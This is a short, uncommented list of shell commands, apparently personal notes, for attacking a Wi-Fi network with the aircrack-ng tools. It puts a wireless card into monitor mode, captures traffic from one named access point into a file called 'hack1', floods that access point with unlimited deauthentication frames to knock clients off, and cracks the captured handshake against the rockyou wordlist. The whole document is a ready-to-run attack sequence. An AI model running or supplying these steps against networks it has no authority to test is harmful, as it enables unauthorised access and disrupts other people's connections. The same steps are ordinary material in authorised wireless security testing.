iwconfig
sudo airmon-ng check kill
sudo airmon-ng start wlan0

sudo airodump-ng -w all wlan0mon
sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon

sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon

airmon-ng stop wlan0mon
aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
